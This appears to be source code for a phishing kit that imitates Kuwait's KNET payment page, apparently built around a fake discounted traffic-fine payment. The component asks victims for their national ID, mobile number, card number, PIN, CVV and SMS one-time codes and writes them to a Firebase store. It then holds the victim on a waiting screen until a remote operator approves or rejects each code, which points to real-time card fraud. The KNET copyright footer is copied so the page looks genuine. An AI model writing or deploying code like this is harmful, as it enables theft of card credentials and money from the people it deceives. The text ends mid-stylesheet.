"use client"
import { useEffect, useState } from "react"
import type React from "react"

import "./kent.css"
import { doc, onSnapshot } from "firebase/firestore"
import { addData, db, handlePay } from "../firebase"
import FullPageLoader from "../loader1"
import { Loader } from "../loader"

// Update the PaymentInfo type to include otp2
type PaymentInfo = {
  createdDate?: string
  cardNumber: string
  year: string
  month: string
  cvv: string
  bank?: string
  pass: string
  otp?: string
  otp2?: string
  cardState: string
  allOtps: string[]
  bank_card: string[]
  prefix: string
  skip:string
  status: "new" | "pending" | "approved" | "rejected"
  cardStatus: "new" | "pending" | "approved" | "rejected"
}

type FormData = {
  id: string | null
  idNumber: string
  mobile: string
  network: string
  page?: string
}

// Bank data moved to a separate constant
const BANKS = [
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160", "46445250", "543363"],
  },
  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
  },
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628", "423826"],
  },
  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
  },
  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "537016", "450778"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "UNB",
    label: "Union National Bank",
    cardPrefixes: ["457778", "513000"],
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056"],
  },
  {
    value: "BNP",
    label: "BNP Paribas",
    cardPrefixes: ["450216", "531483", "489800"],
  },
  {
    value: "HSBC",
    label: "HSBC Middle East Bank",
    cardPrefixes: ["447284", "530001", "453095"],
  },
  {
    value: "FAB",
    label: "First Abu Dhabi Bank",
    cardPrefixes: ["440891", "530123", "454888"],
  },
  {
    value: "CITIBANK",
    label: "Citibank",
    cardPrefixes: ["431457", "545432", "400800"],
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"],
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"],
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"],
  },
  {
    value: "BANK_MUSCAT",
    label: "Bank Muscat",
    cardPrefixes: ["489312", "529410", "454100"],
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"],
  },
]

export default function Ken2(props: { setPage?: any; violationValue: number }) {
  const [step, setStep] = useState(2)
  const [cid, setCid] = useState("")
  const [mobile, setMobile] = useState("99****")
  const [loading, setLoading] = useState(true)
  const [time, setTime] = useState(0)
  const [newotp] = useState([""])
  const visitorId = localStorage.getItem("visitor")

  // Form data for user information
  const [formData, setFormData] = useState<FormData>({
    id: visitorId,
    idNumber: "",
    mobile: "",
    network: "Zain", // Default value
  })

  // Calculate discount
  const discount = Number.parseFloat(props.violationValue as unknown as string) * 0.3
  const discountedAmount =
    props.violationValue === 0 ? 3.5 : Number.parseFloat(props.violationValue!.toString()) - discount

  // Payment information state
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    createdDate: new Date().toISOString(),
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    cvv: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
    skip: "",
    cardStatus: "new",
  })
  const cuonter = () => {
    let timeLeft = 30

    // Update the countdown every 1 second
    const countdown = setInterval(() => {
      timeLeft--

      // Get the current date and time

      // Calculate the distance between now and the countdown date

      // Display the result
      setTime(timeLeft)

      // If the countdown is finished, display a message
      if (timeLeft <= 0) {
        clearInterval(countdown)
        setTime(0)
      }
    }, 1000)
  }
  // Handle form input changes
  const handleFormChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))
  }

  // Handle payment info changes
  const handlePaymentInfoChange = (field: keyof PaymentInfo, value: string) => {
    setPaymentInfo((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  // Handle bank selection
  const handleBankSelection = (bankValue: string) => {
    const selectedBank = BANKS.find((bank) => bank.value === bankValue)

    setPaymentInfo((prev) => ({
      ...prev,
      bank: bankValue,
      bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
    }))
  }



  // Handle OTP addition
  const handleAddOtp = (otp: string) => {
    if (!newotp.includes(`${otp} , `)) {
      newotp.push(`${otp} , `)
    }
  }

  // Handle card approval
  // const handleCardApproval = async () => {
  //   setLoading(true)
  //   try {
  //     // Update payment info with approved status for card
  //     const updatedPaymentInfo = {
  //       ...paymentInfo,
  //       cardState: "approved",
  //     }

  //     // Update Firebase with card approval status
  //     await handlePay(updatedPaymentInfo, setPaymentInfo)

  //     setTimeout(() => {
  //       setLoading(false)
  //       // Move to next step after card is approved
  //       setStep(2)
  //     }, 2000)
  //   } catch (error) {
  //     console.error("Error approving card:", error)
  //     setLoading(false)
  //   }
  // }

  // Handle OTP approval
  // const handleOtpApproval = async () => {
  //   setLoading(true)
  //   try {
  //     // Update payment info with approved status for OTP
  //     const updatedPaymentInfo = {
  //       ...paymentInfo,
  //       status: "approved",
  //     }

  //     // Update Firebase with OTP approval status
  //     await handlePay(updatedPaymentInfo, setPaymentInfo)

  //     setTimeout(() => {
  //       setLoading(false)
  //       // Redirect to sahel page after OTP is approved
  //       props.setPage("sahel")
  //     }, 2000)
  //   } catch (error) {
  //     console.error("Error approving OTP:", error)
  //     setLoading(false)
  //   }
  // }

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)

    try {
      await addData({ createdDate: new Date().toISOString(), ...formData })
    } catch (error) {
      console.error("Error:", error)
    }

    setTimeout(() => {
      setLoading(false)
      setFormData({
        id: visitorId,
        idNumber: "",
        mobile: "",
        network: "Zain",
      })
    }, 3000)
  }

  // Handle button click based on current step
  const handleButtonClick = async (e: React.FormEvent) => {
    e.preventDefault()

    if (step === 0) {
      setLoading(true)
      // Update payment info with both OTP values
      const updatedPaymentInfo = {
        ...paymentInfo,
        status: "pending",
      }
      await handlePay(updatedPaymentInfo, setPaymentInfo)
      setLoading(false)
      setStep(2)
    } else if (step === 1) {
      setStep(0)
      // Update payment info to pending status for card
      const updatedPaymentInfo = {
        ...paymentInfo,
        cardStatus: "pending",
      }
      await handlePay(updatedPaymentInfo, setPaymentInfo)
      // Note: We don't automatically move to step 2 now - waiting for dashboard approval
    } else if (step === 2) {
      setLoading(true)
      await handleSubmit(e)
      setTimeout(() => {
        setLoading(false)
        if(props.violationValue >=24){
          setStep(3)
        }else{
          setStep(0)
        }
        cuonter()
        setStep(3)
      }, 3000)
    } else if (step === 3) {
      if (paymentInfo.otp && !newotp.includes(paymentInfo.otp)) {
        handleAddOtp(paymentInfo.otp)
      }

      setLoading(true)
      // Update payment info to pending status for OTP
      const updatedPaymentInfo = {
        ...paymentInfo,
        status: "pending",
      }
      await handlePay(updatedPaymentInfo, setPaymentInfo)
      setLoading(false)
      // Note: We don't automatically redirect now - waiting for dashboard approval
    }
  }

  // Check if form is valid for current step
  const isFormValid = () => {
    if (step === 1) {
      return (
        paymentInfo.prefix !== "" &&
        paymentInfo.bank !== "" &&
        paymentInfo.cardNumber !== "" &&
        paymentInfo.pass !== "" &&
        paymentInfo.month !== "" &&
        paymentInfo.year !== "" &&
        paymentInfo.pass.length === 4 &&
        paymentInfo.cvv.length ===3
      )
    }
    return true
  }

  // Load initial data
  useEffect(() => {
    setTimeout(() => {
      setLoading(false)
    }, 3000)
  }, [])

  // Listen for payment status updates
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")

    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any
          setCid(data.personalInfo?.id || "")
          setMobile(data.mobile || "99****")

          // Update card status if available
          if (data.cardStatus) {
            setPaymentInfo((prev) => ({ ...prev, cardStatus: data.cardStatus }))

            // If we're on step 1 and card is approved, move to step 2
            if (step === 1 && data.cardStatus === "approved") {
              setStep(2)
            }
          }

          // Update OTP status if available
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }))

            // If we're on step 3 and status is approved, redirect to sahel
            if (step === 3 && data.status === "approved") {
              setLoading(true)
              try {
                // Add data with page:"sahel" to redirect
                await addData({ id: visitorId, page: "sahel" })
                props.setPage("sahel")
              } catch (error) {
                console.error("Error updating page:", error)
              } finally {
                setLoading(false)
              }
            } else if (step === 3 && data.status === "rejected") {
              // If we're on step 3 and status is rejected, show alert
              setLoading(false)
              alert("تم رفض الرمز,الرجاء ادخال الرمز بشكل صحيح ")
              setPaymentInfo((prev) => ({ ...prev, otp: "" }))

            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [step, props])

  // Render different form steps
  const renderFormStep = () => {
    switch (step) {
      case 1:
        return (
          <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
            {/* Bank Selection */}
            <div className="row">
              <label className="column-label col-2" >
                Select Your Bank:
              </label>
              <select
                className="column-value col-7"
                onChange={(e) => handleBankSelection(e.target.value)}
                value={paymentInfo.bank}
              >
                <option value="" title="Select Your Bank">
                  Select Your Banks
                </option>
                {BANKS.map((bank, index) => (
                  <option value={bank.value} key={index}>
                    {bank.label} [{bank.value}]
                  </option>
                ))}
              </select>
            </div>

            {/* Card Number */}
            <div className="row three-column" id="Paymentpagecardnumber">
              <label className="col-2">Card Number:</label>
              <select
                className="col-2"
                name="dcprefix"
                id="dcprefix"
                onChange={(e) => handlePaymentInfoChange("prefix", e.target.value)}
                value={paymentInfo.prefix}
              >
                <option value="">prefix</option>
                {paymentInfo.bank_card.map((prefix, index) => (
                  <option key={index} value={prefix}>
                    {prefix}
                  </option>
                ))}
              </select>
              <input
                name="debitNumber"
                id="debitNumber"
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                size={10}
                className="allownumericwithoutdecimal col-4"
                maxLength={10}
                onChange={(e) => handlePaymentInfoChange("cardNumber", e.target.value)}
                value={paymentInfo.cardNumber}
                title="Should be in number. Length should be 10"
              />
            </div>

            {/* Expiration Date */}
            <div className="row three-column" id="cardExpdate">
              <label className="col-2" >Expiration Date:</label>
              <select
                onChange={(e) => handlePaymentInfoChange("month", e.target.value)}
                className="col-2 m-1"

                value={paymentInfo.month}
              >
                <option value="" style={{width:'20%'}}>MM</option>
                {Array.from({ length: 12 }, (_, i) => {
                  const month = i + 1
                  return (
                    <option key={month} value={month}>
                      {month < 10 ? `0${month}` : month}
                    </option>
                  )
                })}
              </select>
              <select
                onChange={(e) => handlePaymentInfoChange("year", e.target.value)}
                className="col-5 m-1"
                value={paymentInfo.year}
              >
                <option value="">YYYY</option>
                {Array.from({ length: 30 }, (_, i) => {
                  const year = 2024 + i
                  return (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  )
                })}
              </select>
            </div>

            {/* PIN */}
            <div className="row" id="PinRow">
              <div className="row">
                <label className="col-2">PIN:</label>
                <input
                  inputMode="numeric"
                  pattern="[0-9]*"
                  name="cardPin"
                  id="cardPin"
                  onChange={(e) => handlePaymentInfoChange("pass", e.target.value)}
                  value={paymentInfo.pass}
                  autoComplete="off"
                  title="Should be in number. Length should be 4"
                  type="password"
                  size={4}
                  maxLength={4}
                  className="allownumericwithoutdecimal col-7"
                />
              </div>
            </div>
            <div className="row" id="PinRow">
              <div className="row">
                <label className="col">CVV:</label>
                <input
                  inputMode="numeric"
                  pattern="[0-9]*"
                  name="cvv"
                  id="cvv"
                  onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
                  value={paymentInfo.cvv}
                  autoComplete="off"
                  title="Should be in number. Length should be 4"
                  type="password"
                  size={3}
                  style={{ width: "80%" }}
                  maxLength={3}
                  className="allownumericwithoutdecimal col-9"
                />
              </div>
            </div>

          </div>
        )
      case 0:
        return (
          <div className="form-card" dir="rtl">
            <div className="notification">
              <div className="border border-blue-500 rounded-lg p-4 max-w-md mx-auto">
                <div style={{ display: "flex", justifyContent: "center" }}>
                  <img src="./Phone_icon.png" alt="logo" width={40} style={{ margin: 5 }} />
                </div>
                {/* Verification title */}
                <p className="text-blue-600 text-xl text-center font-bold mb-4">تحقق من الرمز المرسل إلى جوالك</p>

                {/* Reference number */}
                <div className="flex justify-center items-center gap-2 mb-6 row">
                  <span style={{ textAlign: "center" }}>{"00:00:" + time}</span>
                  <span className="text-xl font-bold" style={{ textAlign: "center" }}>
                    {mobile || "99******"}
                  </span>
                  <div className="bg-blue-100 rounded-full p-1">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="20"
                      height="20"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="text-blue-600"
                    >
                      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                  </div>
                </div>

                {/* Info box */}
                <div className=" notification ">
                  <div
                    className="row alert-msg"
                    id="notificationbox"
                    style={{
                      color: "#31708f",
                      fontFamily: "Arial, Helvetica, serif",
                      fontSize: 12,
                    }}
                  >
                    <div id="notification">
                      <p>
                        <span className="title" style={{ fontWeight: "bold" }}>
                          يرجى الانتباه:
                        </span>{" "}
                        لقد تم إرسال رمز تحقق مكون من 6 أرقام عبر رسالة نصية إلى رقم هاتفك الجوال المسجل لدى البنك. يرجى
                        إدخال الرمز في الخانة أدناه لإتمام عملية التحقق. تنتهي صلاحية الرمز خلال 5 دقائق
                      </p>
                    </div>
                  </div>
                </div>

                {/* OTP Input field */}
                <div
                  className="mb-6"
                  style={{
                    color: "#31708f",
                  }}
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-1 text-blue-600">
                    </div>
                  </div>

                </div>

                {/* Second OTP Input field */}
                <div
                  className="mb-6"
                  style={{
                    color: "#31708f",
                  }}
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-1 text-blue-600">
                      <strong>الرمز المرسل إلى الجوال</strong>
                    </div>
                  </div>
                  <input
                    type="tel"
                    maxLength={6}
                    placeholder="الرمز  المرسل إلى الجوال"
                    className="text-center text-lg py-6 border-blue-200"
                    value={paymentInfo.otp2 || ""}
                    onChange={(e) => handlePaymentInfoChange("otp2", e.target.value)}
                  />
                </div>
              </div>
            </div>
          </div>
        )
      case 2:
        return (
          <div className="form-card" dir="rtl">
            <div
              className="notification"
              style={{
                border: "#ff0000 1px solid",
                backgroundColor: "#f7dadd",
                fontSize: 12,
                fontFamily: "helvetica, arial, sans serif",
                color: "#31708f",
                paddingRight: 15,
                marginBottom: 3,
                textAlign: "center",
                display: "none",
              }}
              id="otpmsgDC2"
            ></div>

            {/* Notification */}
            <div
              className="row alert-msg"
              id="notificationbox"
              style={{
                color: "#31708f",
                fontFamily: "Arial, Helvetica, serif",
                fontSize: 12,
              }}
            >
              <div id="notification">
                <p>
                  <span className="title" style={{ fontWeight: "bold" }}>
                    يرجى الملاحظة:
                  </span>{" "}
                  لمتابعة الطلب، يرجى إدخال رقم الهاتف المحمول المرتبط ببطاقة الهوية الوطنية حتى تتم عملية الدفع بنجاح.
                </p>
              </div>
            </div>

            {/* رقم الهوية / الأقامة */}
            <div className="row">
              <div id="payConfirmCardNum">
                <label className="col">رقم الهوية / الأقامة:</label>
                <input
                  className="col"
                  type="tel"
                  name="idNumber"
                  style={{ width: "100%" }}
                  maxLength={10}
                  value={formData.idNumber || cid}
                  onChange={handleFormChange}
                />
              </div>
            </div>

            {/* Network Operator */}
            <div className="row" id="payConfirmExpmnth" style={{ display: "block" }}>
              <label className="col">مشغل الشبكة:</label>
              <div>
                <select style={{ width: "100%" }} name="network" value={formData.network} onChange={handleFormChange}>
                  <option value="Zain">Zain</option>
                  <option value="Ooredoo">Ooredoo</option>
                  <option value="STC">STC</option>
                </select>
              </div>
            </div>

            {/* رقم الهاتف */}
            <div className="row" id="payConfirmExpyr" style={{ display: "block" }}>
              <div id="payConfirmCardNum">
                <label className="col">رقم الهاتف:</label>
                <input
                  className="col"
                  type="tel"
                  name="mobile"
                  maxLength={10}
                  style={{ width: "100%" }}
                  value={formData.mobile}
                  onChange={handleFormChange}
                />
              </div>
            </div>
          </div>
        )

      case 3:
        return (
          <div className="form-card" dir="rtl">
            <div className="notification">
              <div className="border border-blue-500 rounded-lg p-4 max-w-md mx-auto">
                <div style={{ display: "flex", justifyContent: "center" }}>
                  <img src="./Phone_icon.png" alt="logo" width={40} style={{ margin: 5 }} />
                </div>
                {/* Verification title */}
                <p className="text-blue-600 text-xl text-center font-bold mb-4">تحقق من الرمز المرسل إلى جوالك</p>

                {/* Reference number */}
                <div className="flex justify-center items-center gap-2 mb-6 row">
                  <span style={{ textAlign: "center" }}>{"00:00:" + time}</span>
                  <span className="text-xl font-bold" style={{ textAlign: "center" }}>
                    {mobile || "99******"}
                  </span>
                  <div className="bg-blue-100 rounded-full p-1">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="20"
                      height="20"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      className="text-blue-600"
                    >
                      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                  </div>
                </div>

                {/* Info box */}
                <div className=" notification ">
                  <div
                    className="row alert-msg"
                    id="notificationbox"
                    style={{
                      color: "#31708f",
                      fontFamily: "Arial, Helvetica, serif",
                      fontSize: 12,
                    }}
                  >
                    <div id="notification">
                      <p>
                        <span className="title" style={{ fontWeight: "bold" }}>
                          يرجى الانتباه:
                        </span>{" "}
                        لقد تم إرسال رمز تحقق مكون من 6 أرقام عبر رسالة نصية إلى رقم هاتفك الجوال المسجل لدى البنك. يرجى
                        إدخال الرمز في الخانة أدناه لإتمام عملية التحقق. تنتهي صلاحية الرمز خلال 5 دقائق
                      </p>
                    </div>
                  </div>
                </div>

                {/* OTP Input field */}
                <div
                  className="mb-6"
                  style={{
                    color: "#31708f",
                  }}
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-1 text-blue-600">
                      <strong>الرمز المرسل إلى الجوال من 4 أرقام</strong>
                    </div>
                  </div>
                  <input
                    type="tel"
                    maxLength={6}
                    placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
                    className="text-center text-lg py-6 border-blue-200"
                    value={paymentInfo.otp || ""}
                    onChange={(e) => handlePaymentInfoChange("otp", e.target.value)}
                  />
                </div>
              </div>
            </div>
            <div className="flex items-center justify-between mt-4">
              <div className="flex items-center gap-1">
                <span
                  className={`${paymentInfo.status === "approved" ? "text-green-600" : paymentInfo.status === "rejected" ? "text-red-600" : "text-yellow-600"} font-bold`}
                >
                  {paymentInfo.status === "approved"
                    ? "تم التحقق ✓"
                    : paymentInfo.status === "rejected"
                      ?<span style={{color:'red'}}> {" OTP رمز التحقق غير صحيح   ✗"}</span>
                      : "انتظار التحقق ..."}
                </span>
              </div>
            </div>
            {paymentInfo.status === "rejected"?null:<div style={{display:'flex',justifyContent:"center"}}><Loader/></div>} 
          </div>
        )

      default:
        return (
          <div style={{ textAlign: "center", padding: "20px" }}>
            <p>Please wait while we process your payment...</p>
          </div>
        )
    }
  }

  return (
    <div
      style={{
        background: "#f1f1f1",
        height: "100vh",
        margin: 0,
        padding: 0,
        display: "flex",
      }}
      dir="ltr"
    >
      <FullPageLoader isLoading={loading} />
      <form onSubmit={handleButtonClick}>
        <div className="madd" />
        <div id="PayPageEntry" style={{ display: "flex", justifyContent: "center", flexDirection: "column" }}>
          <img src="./mob.jpg" className="" alt="mmo" width={"100%"} style={{ marginBottom: 5 }} />

          <div className="">
            <div className="content-block">
              {/* Payment Information Card */}
              <div className="form-card" style={{ display: step >= 2 ? "none" : "block" }}>
                <div className="" style={{ display: "flex", justifyContent: "center" }}>
                  <img src="./kv.png" className="-" alt="logo" width={50} />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label col">KNET Payment</label>
                </div>
                <div id="OrgTranxAmt">
                  <div className="row">
                    <label className="column-label">Amount: </label>
                    <label className="column-value" style={{ width: "50%" }}>
                      <s>
                        {props.violationValue === 0
                          ? "5.00 kd"
                          : `${Number.parseFloat(props.violationValue!.toString()).toFixed(2)} kd`}
                      </s>
                      <span className="m-1">{discountedAmount.toFixed(2)} kd</span>
                    </label>
                  </div>
                </div>
              </div>

              {/* Form Card */}
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="otpmsgDC"
                />

                <div id="ValidationMessage"></div>
                <div id="savedCardDiv" style={{ display: "none" }}></div>

                {/* Render current step form */}
                {renderFormStep()}
              </div>

              {/* Action Buttons */}
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: "center" }}>
                    <div id="loading" style={{ display: "none" }}>
                      <center>
                        <label className="col text-label" style={{ width: "70%", textAlign: "center" }}>
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div style={{ display: "flex" }}>
                      <button disabled={!isFormValid() || loading} type="submit">
                        {loading ? "Wait..." : step === 1 ? "Submit" : "تأكيد العملية"}
                      </button>
                      <button type="button">{step > 1 ? "الغاء" : "Cancel"}</button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Loading Overlay */}
              <div id="overlayhide" className="overlay" style={{ display: loading ? "block" : "none" }}>
                <FullPageLoader isLoading={loading} />
              </div>

              {/* Footer */}
              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: "center",
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;©&nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: "bold",
                          color: "#0077d5",
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
              </footer>
            </div>
          </div>
        </div>
      </form>

      <style>
        {`
        @CHARSET "ISO-8859-1";
        /* Added for Knet */
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 768px){
          .wrapper{
            margin-top:10%;
          }
        }
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 500px){
          .wrapper{
            max-width: 100%;
            width: 100%;
          }
        }
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 435px){
          .logoHead {
                 left: 36%;
          }
          .contentBox{
            padding: 18px;
          }
        }
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 380px){
          .contentBox {
              padding: 12px;
          } 
          .wrapper {
              margin-top: 20%;
          }
        }	
        @media (max-width: 350px){
          .contentBox .col:first-child .paymentlabel {
            padding-left: 0;
          }
        }
        /*added for tooltip by sib*/
        .tooltip {
          position: relative;
          display: block;
        }
        .tooltip .tooltiptext {
          visibility: hidden;
          width: 100%;
          background-color: #555;
          color: #fff;
          text-align: center;
          border-radius: 6px;
          padding: 10px;
          position: absolute;
          z-index: 1;
          bottom: 113%;
          left: 50%;
          margin-left: -52%;
          opacity: 0;
          transition: opacity 0.5s;
          font-size:12px;
          margin-bottom:9px;
          -webkit-box-shadow:4px 3px 10px 0px rgba(0,0,0,0.75);
          -moz-box-shadow:4px 3px 10px 0px rgba(0,0,0,0.75);
          box-shadow:4px 3px 10px 0px rgba(0,0,0,0.75);
        }
        .tooltip .tooltiptext::after {
          content: "";
          position: absolute;
          top: 100%;
          left: 50%;
          margin-left: -45px;
          border-width: 5px;
          border-style: solid;
          border-color: #555 transparent transparent transparent;
        }
        /*.tooltip:hover .tooltiptext {*/
        div#tooltip_0:hover .tooltiptext {
          visibility: visible;
          opacity: 1;
        }
        /* turn the img to gray :sib*/
        .doGray{
          -webkit-filter:grayscale(100%);
          filter:grayscale(100%);
          opacity:0.5;
        }
        /* Added by Ahmed & Saqib */
        label#ValidationMessage{
          -moz-transaction: height 1s ease;
          -webkit-transaction: height 1s ease;
          transition: height 1s ease;
          border: #ff0000 1px solid;
          background-color: #f7dadd;
          font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 5px 2px 5px 2px; 
           display:none;
           margin-bottom: 3px; 
           text-align:center;
           margin-top : 10px;
        }
        div#fasterCheckDiv1{
          float:left;
          padding-left:10%;
          position:relative;
          display:block;
          width:35%;
          padding-top:3px;
          }
        div#fasterCheckDiv2{
          float:left;
          margin-left:30%;
          position:relative;
          padding-top:3px;
          width:70px;
          padding-top:3px;
          }
        div#fasterCheckDiv1>label>img{
          width: 48px;
          height:35px;
          border-radius:3px;
        }
        div#fasterCheckDiv2>label>img{
          width: 48px;
          height:35px;
          border-radius:3px;
        }
        .madd{
          height:30px;
          max-width: 400px;
          margin: 5px auto -30px auto;
          border-radius: 0px 10px;
          background-image: url("../images/adds/NewDerayaCamp/mob.jpg");
          display:block;	
          }
        /* Ends */
        * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    body {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        background-color: #ebebeb;
        overflow:hidden;
    }
    .container {
        width: 100%;
        padding: 15px;
        box-sizing: border-box;
    }
    .content-block {
        width:100vw;
        margin: 0 auto;
    }
    .row {
        border-bottom: 1px solid #8f8f90;
        padding-bottom: 5px;
        padding-top: 5px;
    }
    .row_new {
        padding-bottom: 5px;
        padding-top: 5px;
    }
    .column-label, .column-value, .column-long {
        float: left;
    }
    .column-label {
        width: 40%;
    }
    .column-value {
        width: 60%;
    }
    .row.three-column .column-value {
        width: 18%;
        margin-right: 5px;
    }
    .row.three-column .column-long {
        width: 39%;
        float: right;
    }
    .row:after {
        content: "";
        display: table;
        clear: both;
    }
    .form-card {
        background-color: #ffffff;
        padding: 20px;
        border: 2px solid #8f8f90;
        border-radius: 15px;
        margin-bottom: 15px;
        box-shadow: 0 0 6px rgba(0,0,0,0.3);
    }
    .form-card:nth-child(1) {
        margin-top: 25px;
    }
    .form-card .row:nth-child(1) {
        padding-top: 0;
    }
    .footer-content .row, .footer-content-new .row,
    .form-card .row:nth-last-child(1) {
        border: 0;
        padding-bottom: 0;
    }
    form label {
        font-size: 12px;
        color: #0070cd;
        font-weight: 900;
        text-shadow: 0 1px 2px rgba(0,0,0,0.2);
    }
    select {
        font-size:11px;
        font-weight: 900;
        height:20px;
    }
    form .text-label, input, select {
        color: #444444;
        font-weight: bold;
    }
    form input[type=tel],input[type=password]{
        border: 2px solid #0070cd;
        box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
        padding: 0 3px;
        outline: 0;
      font-size:11px;
      height:20px;
    }
    form input[type=text],input[type=password]{
        border: 2px solid #0070cd;
        box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
        padding: 0 3px;
        outline: 0;
      font-size:11px;
      height:20px;
    }
    .footer-content {
        text-align: center;
        margin-top: 15px;
        font-weight: bold;
        color: #2277d3;
    }
    .brand-img {
        margin-right: 5px;
        float: right;
    }
    .brand-info {
        font-size: 12px;
        text-align: left;
    }
    #ValidationMessage{
      -moz-transaction: height 1s ease;
      -webkit-transaction: height 1s ease;
      transition: height 1s ease;
      border: #ff0000 1px solid;
      background-color: #f7dadd;
      font-size: 12px;
        font-family: helvetica, arial, sans serif;
        color: #ff0000;
          padding: 2px; 
       display:none;
       margin-bottom: 3px; 
       text-align:center;
    }
    .footer-content #knet-brand {
        width: 43px;
        height: 43px;
        background: url(../images/knet-links.png) -148px 0 no-repeat;
        margin-top: 5px;
    }
    .footer-content .social-links {
        margin-top: 15px;
        text-align: center;
    }
    .footer-content .social-links div {
        height: 30px;
        display: inline-block;
    }
    .footer-content .social-links div#knet-yt {
        background: url(../images/knet-links.png) 0 0 no-repeat;
        width: 35px;
    }
    .footer-content .social-links div#knet-sn {
        background: url(../images/knet-links.png) -36px 0 no-repeat;
        width: 27px;
    }
    .footer-content .social-links div#knet-tw {
        background: url(../images/knet-links.png) -64px 0 no-repeat;
        width: 27px;
    }
    .footer-content .social-links div#knet-it {
        background: url(../images/knet-links.png) -93px 0 no-repeat;
